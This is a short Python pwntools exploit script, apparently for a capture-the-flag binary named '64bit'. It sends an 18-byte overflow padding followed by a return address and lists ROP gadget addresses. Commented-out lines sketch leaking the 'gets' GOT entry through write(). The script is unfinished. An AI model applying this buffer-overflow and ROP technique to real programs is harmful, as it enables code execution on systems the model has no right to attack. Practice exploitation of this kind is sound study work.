from pwn import *
context.log_level = 'debug'
p = process('./64bit')
#AAAAAAAAAAAAAAAAAA\xf3QUUUU\x00
e = ELF('./64bit')
w_plt = e.plt['write']
buf2 = e.symbols['buf2']
vul = e.symbols['vul']
gets_got = e.got["gets"]
#0x0000555555555000  0x00005555555551f3
#0x00000000000011f3 : pop rdi ; ret
#0x00000000000011f1 : pop rsi ; pop r15 ; ret
pop_rdi = 0x00000000000011f3
pop_rsi = 0x00000000000011f1
#write(1,buf,size)
#payload = "A"*18+p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(gets_got)+p64(1)+p64(w_plt)+p64(vul)
payload = "A"*18+p64(vul)
p.sendlineafter("hello",payload)
#gets = u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
